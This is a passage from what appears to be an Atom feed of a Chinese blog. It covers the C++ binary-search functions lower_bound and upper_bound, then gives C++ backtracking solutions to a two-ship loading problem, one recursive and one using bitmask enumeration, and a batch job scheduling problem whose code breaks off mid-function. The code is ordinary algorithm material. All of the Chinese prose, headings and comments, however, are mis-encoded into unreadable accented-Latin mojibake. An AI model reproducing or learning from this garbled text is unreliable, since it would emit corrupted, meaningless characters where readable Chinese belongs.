ä¸º<strong>è°“è¯å‡½æ•°</strong>ï¼Œä¸æ’åºç­‰ç®—æ³•çš„è°“è¯å‡½æ•°ç±»ä¼¼ï¼Œå³ç¬¬ä¸€å‚æ•°å…ˆåºäºç¬¬äºŒå‚æ•°æ—¶ï¼Œè¿”å› <em>true</em>ï¼Œå¦åˆ™è¿”å› <em>false</em>.</p><p>è¯¥å‡½æ•°çš„è¿”å›å€¼ä¸ºæŒ‡å‘èŒƒå›´ <em>first</em> å’Œ <em>last</em> ä¹‹é—´çš„é¦–ä¸ªä¸æ»¡è¶³å…ƒç´ å€¼ <code>element &lt; value</code> æˆ–è€… <code>comp(element, value)</code> çš„å…ƒç´ çš„è¿­ä»£å™¨ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™è¿”å› <em>last</em>.</p><ul><li><code>upper_bound(first, last, value, comp);</code></li></ul><p>å‚æ•°ä¸ <em>lower_bound</em> ç›¸åŒï¼Œè€Œè¿”å›å€¼ä¸ºæŒ‡å‘èŒƒå›´ <em>first</em> å’Œ <em>last</em> ä¹‹é—´çš„é¦–ä¸ªæ»¡è¶³å…ƒç´ å€¼ <code>element &gt; value</code> æˆ–è€… <code>comp(value, element)</code> çš„å…ƒç´ çš„è¿­ä»£å™¨ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™è¿”å› <em>last</em>.</p><p>è¿™é‡Œåªæ˜¯ç®€å•çš„ä»‹ç»äº†ä¸€ä¸‹ä¸¤ç§äºŒåˆ†æ“ä½œçš„å‚æ•°åŠè¿”å›å€¼ï¼Œæƒ³è¦äº†è§£å…·ä½“ä¿¡æ¯ï¼Œå¯å‚è€ƒ <strong>cppreference</strong>.</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://www.bilibili.com/video/BV1AP41137w7/?vd_source=8cf6c757d07cf014cd9ca13a60132b66">äºŒåˆ†æŸ¥æ‰¾ çº¢è“æŸ“è‰²æ³•ã€åŸºç¡€ç®—æ³•ç²¾è®²ã€‘ - å“”å“©å“”å“©</a></p><p><a href="https://www.zhihu.com/question/36132386">äºŒåˆ†æŸ¥æ‰¾æœ‰å‡ ç§å†™æ³•ï¼Ÿå®ƒä»¬çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ - çŸ¥ä¹</a></p><p><a href="https://blog.csdn.net/groovy2007/article/details/78309120">äºŒåˆ†æŸ¥æ‰¾ä¸­çš„å¾ªç¯ä¸å˜å¼_äºŒåˆ†æœç´¢çš„å¾ªç¯ä¸å˜å¼ - groovy2007çš„åšå®¢</a></p><p><a href="https://zh.cppreference.com/w/cpp/algorithm/lower_bound">std::lower_bound - cppreference.com</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ€è¿‘åœ¨æ¯”èµ›å’Œåˆ·é¢˜çš„æ—¶å€™ç»å¸¸é‡åˆ°äºŒåˆ†ç­”æ¡ˆçš„é¢˜ï¼Œä½†æ—¶ä¸æ—¶ä¼šå› ä¸ºä¸€äº›ç»†èŠ‚ä¸Šçš„é”™è¯¯è€Œæµªè´¹æ—¶é—´ï¼Œæœ¬æ–‡æ—¨åœ¨æ•´ç†å¸¸è§çš„äºŒåˆ†æœç´¢çš„å†™æ³•ã€äºŒåˆ†æœç´¢å¯èƒ½ä¼šé‡åˆ°çš„ä¸€äº›å°é—®é¢˜ï¼Œä»¥åŠ &lt;em&gt;C++&lt;/em&gt; ä¸­ä¸äºŒåˆ†æœç´¢ç›¸å…³çš„åº“å‡½æ•°ï¼Œä»¥å…ä»Šåå†çŠ¯ç±»ä¼¼çš„é”™è¯¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ•°æ®ç»“æ„ä¸ç®—æ³•" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="ç®—æ³•" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="æ•°æ®ç»“æ„" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>ç®—æ³•åˆ†æä¸è®¾è®¡ç¼–ç¨‹é¢˜ å›æº¯æ³•</title>
    <link href="http://lordaeronesz.github.io/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
    <id>http://lordaeronesz.github.io/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/</id>
    <published>2023-09-09T01:03:08.000Z</published>
    <updated>2023-10-03T14:33:49.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è£…è½½é—®é¢˜"><a href="#è£…è½½é—®é¢˜" class="headerlink" title="è£…è½½é—®é¢˜"></a>è£…è½½é—®é¢˜</h1><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/load.png"></p><h2 id="è§£é¢˜ä»£ç "><a href="#è§£é¢˜ä»£ç " class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><h3 id="é€’å½’å›æº¯"><a href="#é€’å½’å›æº¯" class="headerlink" title="é€’å½’å›æº¯"></a>é€’å½’å›æº¯</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// goods[i]è¡¨ç¤ºè´§ç‰©içš„é‡é‡, c1,c2åˆ†åˆ«è¡¨ç¤ºè´§èˆ¹1å’Œè´§èˆ¹2çš„è½½é‡é‡</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">optimalLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> goods<span class="token punctuation">,</span> <span class="token keyword">int</span> c1<span class="token punctuation">,</span> <span class="token keyword">int</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> goods<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è´§ç‰©æ•°é‡</span><span class="token keyword">int</span> maxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// å½“å‰æœ€å¤§è½½è´§é‡</span><span class="token comment">// curSelection[i]è¡¨ç¤ºè´§ç‰©iæ˜¯å¦æ”¾å…¥è´§èˆ¹1ä¸­ï¼ˆtrueè¡¨ç¤ºæ”¾å…¥ï¼‰</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curSelection</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// optimSelectionè®°å½•maxSumå¯¹åº”çš„è´§ç‰©å­˜æ”¾æ–¹å¼</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> optimSelection<span class="token punctuation">;</span><span class="token comment">// é€’å½’æœç´¢å‡½æ•°</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æœç´¢è¾¾åˆ°æœ€å¤§æ·±åº¦ï¼Œå¾—åˆ°ä¸€ä¸ªè§£</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> maxSum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æ›´æ–°æœ€ä¼˜è§£</span>maxSum <span class="token operator">=</span> sum<span class="token punctuation">;</span>optimSelection <span class="token operator">=</span> curSelection<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// è´§ç‰©idxèƒ½å¦æ”¾å…¥è´§èˆ¹1ï¼Œè‹¥èƒ½ï¼Œåˆ™å‘ä¸‹æœç´¢</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> c1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>curSelection<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>curSelection<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ä¸è€ƒè™‘å°†è´§ç‰©idxæ”¾å…¥è´§èˆ¹1</span><span class="token function">dfs</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ‰§è¡Œæœç´¢ï¼Œåˆå§‹æ—¶sumå’Œidxå‡ä¸º0</span><span class="token comment">// åˆ¤æ–­åœ¨æœ€ä¼˜è§£æƒ…å†µä¸‹ï¼ˆå°†å°½å¯èƒ½é‡çš„è´§ç‰©æ”¾å…¥è´§èˆ¹1åï¼‰ï¼Œä½™ä¸‹çš„è´§ç‰©èƒ½å¦æ”¾å…¥è´§èˆ¹2</span><span class="token keyword">int</span> sum2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum2 <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum2 <span class="token operator">></span> c2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// è‹¥ä¸èƒ½ï¼Œåˆ™æ­¤é—®é¢˜æ— è§£ï¼Œè¿”å›ç©ºæ•°ç»„</span><span class="token comment">// è‹¥èƒ½ï¼Œåˆ™æ„é€ æœ€ä¼˜è§£</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// é€‰æ‹©æ”¾å…¥è´§èˆ¹1</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// é€‰æ‹©æ”¾å…¥è´§èˆ¹2</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="çŠ¶æ€å‹ç¼©"><a href="#çŠ¶æ€å‹ç¼©" class="headerlink" title="çŠ¶æ€å‹ç¼©"></a>çŠ¶æ€å‹ç¼©</h3><p>äº‹å®ä¸Šï¼Œå¯¹äºæ­¤ç±»æ¶‰åŠ<strong>é€‰æˆ–ä¸é€‰</strong>çš„å›æº¯ç®—æ³•ï¼Œè¿˜å¯ä»¥å°†å…¶å†™æˆè¿­ä»£çš„å½¢å¼ã€‚</p><p>ç”±äºé€’å½’å›æº¯çš„æœ¬è´¨å¯ä»¥çœ‹ä½œæ˜¯å¯¹ä¸€æ£µäºŒå‰æ ‘è¿›è¡Œçš„æœç´¢ï¼Œæ¯æ¬¡é€‰æˆ–è€…ä¸é€‰éƒ½å°†äº§ç”Ÿä¸¤ä¸ªåˆ†æ”¯ï¼Œé‚£ä¹ˆæ‰€æœ‰æƒ…å†µçš„æ•°é‡ä¸º 2<sup>n</sup>ï¼ˆn ä¸ºè¢«æœç´¢å¯¹è±¡çš„æ•°ç›®ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸ºè´§ç‰©çš„æ€»æ•°ï¼‰ã€‚æˆ‘ä»¬è€ƒè™‘ç”¨ä¸€ä¸ªæ•´æ•° mask å°†æ¯ç§æƒ…å†µè¡¨ç¤ºå‡ºæ¥ï¼Œè¯¥æ•´æ•°ç§°ä¸º<strong>æ©ç </strong>ï¼Œå…³æ³¨å®ƒçš„ n ä½äºŒè¿›åˆ¶å½¢å¼ï¼Œå…¶ä¸­ mask çš„ç¬¬ i ä½äºŒè¿›åˆ¶ä½å°±ä»£è¡¨å¯¹åº”çš„è´§ç‰© <code>goods[i]</code>  æœ‰æ²¡æœ‰è¢«é€‰æ‹©ï¼Œé€šå¸¸ç”¨ 1 ä»£è¡¨è¢«é€‰æ‹©ï¼Œ0 ä»£è¡¨ä¸è¢«é€‰æ‹©ã€‚é‚£ä¹ˆä¸éš¾å¾—çŸ¥ mask çš„èŒƒå›´ä¸º 0~2<sup>n</sup>-1 ã€‚</p><p>åœ¨å¾—åˆ°äº†æ¯ä¸€ç§æƒ…å†µä¸‹çš„æ©ç åï¼Œå°±éœ€è¦å¯¹å…¶è¿›è¡Œ<strong>è§£ç </strong>äº†ï¼Œå¯ä»¥éå† 0~n-1 çš„æ‰€æœ‰æ•´æ•° iï¼Œå¹¶å°†å…¶å³ç§» i ä½ï¼Œå°† <code>goods[i]</code> çš„å¯¹åº”çš„äºŒè¿›åˆ¶ä½ç§»åˆ°äº†æœ€ä½ä½ï¼Œæ­¤æ—¶å†å°†å’Œ 1 è¿›è¡Œ<strong>æŒ‰ä½ä¸</strong>è¿ç®—å°±èƒ½å¾—çŸ¥æ­¤æƒ…å†µä¸‹è´§ç‰© i æ˜¯å¦è¢«é€‰æ‹©ã€‚</p><p>ä¸¤ç§ç®—æ³•éƒ½æœ‰ 2<sup>n</sup> ä¸­æœç´¢çŠ¶æ€ï¼Œæ¯ç§çŠ¶æ€ä¸‹éœ€è¦ O(n) æ—¶é—´æ¥è¿›è¡Œæœ€ä¼˜è§£çš„æ›´æ–°ï¼Œå› æ­¤ä¸¤ç§ç®—æ³•çš„æ¸è¿›æ—¶é—´å¤æ‚åº¦éƒ½ä¸º O(n * 2<sup>n</sup>).</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">optimalLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> goods<span class="token punctuation">,</span> <span class="token keyword">int</span> c1<span class="token punctuation">,</span> <span class="token keyword">int</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> goods<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curSelection</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> optimSelection<span class="token punctuation">;</span><span class="token keyword">int</span> maxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> mask <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>mask<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// éå†æ¯ç§æƒ…å†µ</span><span class="token comment">// å°†sumå’ŒcurSelectionå…¨éƒ¨å¤ä½</span><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>curSelection<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">bool</span> isChoosed <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">>></span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isChoosed<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> c1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>curSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> maxSum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>maxSum <span class="token operator">=</span> sum<span class="token punctuation">;</span>optimSelection <span class="token operator">=</span> curSelection<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// æ„é€ æœ€ä¼˜è§£ï¼ˆä¸é€’å½’å›æº¯éƒ¨åˆ†å®Œå…¨ç›¸åŒï¼‰</span><span class="token keyword">int</span> sum2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum2 <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum2 <span class="token operator">></span> c2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="æ‰¹å¤„ç†ä½œä¸šè°ƒåº¦"><a href="#æ‰¹å¤„ç†ä½œä¸šè°ƒåº¦" class="headerlink" title="æ‰¹å¤„ç†ä½œä¸šè°ƒåº¦"></a>æ‰¹å¤„ç†ä½œä¸šè°ƒåº¦</h1><h2 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/job.png"></p><h2 id="è§£é¢˜ä»£ç -1"><a href="#è§£é¢˜ä»£ç -1" class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">batchJobScheduling</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> jobs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> jobs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä½œä¸šæ•°é‡</span><span class="token keyword">int</span> res <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> curSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// æœ€ä¼˜è°ƒåº¦æ—¶é—´ï¼Œå½“å‰è°ƒåº¦æ—¶é—´</span><span class="token keyword">int</span> f1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// æœºå™¨1å®Œæˆå¤„ç†æ—¶é—´</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">f2</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æœºå™¨2å®Œæˆå¤„ç†æ—¶é—´</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> optimSche<span class="token punctuation">;</span> <span class="token comment">// æœ€ä¼˜è°ƒåº¦æ–¹æ¡ˆ</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> curSche<span class="token punctuation">;</span> <span class="token comment">// å½“å‰è°ƒåº¦æ–¹æ¡ˆ</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// åˆå§‹è°ƒåº¦æ–¹æ¡ˆä¸º 0,1,2,...,n-1</span>curSche<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// é€’å½’æœç´¢å‡½æ•°</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æœç´¢è¾¾åˆ°æœ€å¤§æ·±åº¦</span><span class="token comment">// æ›´æ–°æœ€ä¼˜è§£</span>optimSche <span class="token operator">=</span> curSche<span class="token punctuation">;</span>res <span class="token operator">=</span> curSum<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> idx<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å…¨æ’åˆ—æœç´¢</span>f1 <span class="token operator">+=</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">></span> f1<span class="token punctuation">)</span> <span class="token operator">?</span> f2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">:</span> f1<span class="token punctuation">)</span> <span class="token operator">+</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>curSum <span class="token operator">+=</span> f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curSum <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 